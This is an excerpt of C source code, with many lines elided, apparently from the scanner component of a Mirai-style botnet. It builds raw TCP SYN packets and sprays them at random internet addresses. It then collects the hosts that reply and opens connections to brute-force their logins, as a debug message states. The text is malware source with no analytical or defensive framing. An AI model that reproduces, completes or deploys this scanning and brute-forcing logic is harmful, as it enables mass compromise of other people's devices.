...
int scanner_pid, iRawSocket, rsck_out, auth_table_len = 0;
char scanner_rawpkt[sizeof (struct ip) + sizeof (struct tcphdr)] = {0};
...
void scanner_init(void)
{
    ...
    if ((iRawSocket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        printf("[scanner] Failed to initialize raw socket, cannot scan\n");
        exit(0);
    }

    fcntl(iRawSocket, F_SETFL, O_NONBLOCK | fcntl(iRawSocket, F_GETFL, 0));

    i = 1;
    if (setsockopt(iRawSocket, IPPROTO_IP, IP_HDRINCL, &i, sizeof (i)) != 0)
    {
    ...
    pstIpHeader = (struct ip *)scanner_rawpkt;
    ...
    pstTcpHeader->th_sport = source_port;
    pstTcpHeader->th_off = 5;
    pstTcpHeader->th_win = rand_next() & 0xffff;
    ...
    while (true)
    {
        ...
        if (fake_time != last_spew)
        {
            ...
            for (i = 0; i < SCANNER_RAW_PPS; i++)
            {
                ...
                pstIpheader->ip_src = LOCAL_ADDR;
                pstIpheader->ip_dst = get_random_ip();
                pstIpheader->ip_sum = 0;
                pstIpheader->ip_sum = checksum_generic((uint16_t *)pstIpheader, sizeof (struct iphdr));
                ...
                pstTcpHeader->th_sum = checksum_tcpudp(pstIpheader, pstTcpHeader, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));
                ...
                sendto(iRawSocket, scanner_rawpkt, sizeof (scanner_rawpkt),
        ...
        while (1)
        {
            ...
            struct tcphdr *tcph = (struct tcphdr *)(pstIpHeader + 1);
            struct scanner_connection *conn;

            errno = 0;
            n = (int)recvfrom(iRawSocket, dgram, sizeof (dgram),
#if (defined(__APPLE__) && defined(__MACH__))
                              SO_NOSIGPIPE,
#else
                              MSG_NOSIGNAL,
            ...
            if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if (pstIpHeader->daddr != LOCAL_ADDR)
                continue;
            if (pstIpHeader->protocol != IPPROTO_TCP)
                continue;
            ...
            if (tcph->fin)
                continue;
            if (htonl(ntohl(tcph->ack_seq) - 1) != pstIpHeader->saddr)
                continue;
            ...
            conn->dst_addr = pstIpHeader->saddr;
            conn->dst_port = tcph->source;
            setup_connection(conn);
#ifdef DEBUG
            printf("[scanner] FD%d Attempting to brute found IP %d.%d.%d.%d\n", conn->fd, pstIpHeader->saddr & 0xff, (pstIpHeader->saddr >> 8) & 0xff, (pstIpHeader->saddr >> 16) & 0xff, (pstIpHeader->saddr >> 24) & 0xff);
#endif
        }
